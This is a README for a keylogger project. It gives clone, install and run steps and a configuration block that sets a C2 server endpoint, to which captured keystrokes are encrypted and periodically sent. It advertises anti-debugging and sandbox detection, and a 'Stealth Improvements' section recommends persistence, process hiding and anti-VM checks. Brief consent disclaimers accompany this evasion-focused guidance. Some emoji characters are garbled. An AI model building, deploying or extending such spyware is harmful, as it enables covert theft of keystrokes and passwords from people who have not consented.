# Keylogger Application

This is a secure keylogger implementation with encryption and remote logging capabilities.

## Features
- Keystroke logging with special key handling
- AES-256 encryption of all captured data
- Secure transmission to C2 server
- Anti-debugging and sandbox detection
- Cross-platform support (Windows/Linux/macOS)

## Installation
1. Clone the repository:
   ```bash
   git clone https://github.com/JackDonwel/keylogger.git
   cd keylogger

    Create and activate virtual environment:
    bash

python -m venv .venv
source .venv/bin/activate  # Linux/macOS
.venv\Scripts\activate    # Windows

Install dependencies:
bash

    pip install -r requirements.txt

Configuration

Edit keylogger.py with your settings:
python

C2_SERVER = "http://your-real-c2-server.com/log"  # Replace with actual endpoint
KEY = b"YourSecureKey123456"  # 16/24/32 byte AES key
IV = b"SecureInitVector"     # 16-byte initialization vector

Usage
bash

python keylogger.py

The program will:

    Start logging keystrokes to temporary storage

    Encrypt all captured data

    Periodically send encrypted logs to C2 server

    Run anti-debug checks

To stop: Press Ctrl+C
Security Features

    AES-CBC mode encryption with PKCS7 padding

    Base64 encoding for safe transmission

    Encrypted local storage

    Debugger detection (Windows)

    Daemonized logging thread

Important Notes

    üîí Change the default KEY and IV values before use

    ‚ö†Ô∏è Only use on systems where you have explicit permission

    ‚ö†Ô∏è Keylogging without consent is illegal in most jurisdictions

    üîê Use HTTPS for C2 communication in production

### Important Recommendations:
1. **Security Enhancements**:
   - Generate random keys using `os.urandom(16)` instead of hardcoded values
   - Implement HMAC for message authentication
   - Add SSL certificate verification for C2 communication

2. **Stealth Improvements**:
   - Add persistence mechanism (registry/scheduled tasks)
   - Implement process hiding techniques
   - Add more anti-VM checks

3. **Ethical Considerations**:
   - Only use for authorized security testing
   - Implement proper access controls
   - Include conspicuous notice in production use

4. **To Run**:
   ```bash
   # After installing dependencies
   python keylogger.py

Remember to always use this tool ethically and legally. Monitoring users without explicit consent is illegal in most countries.
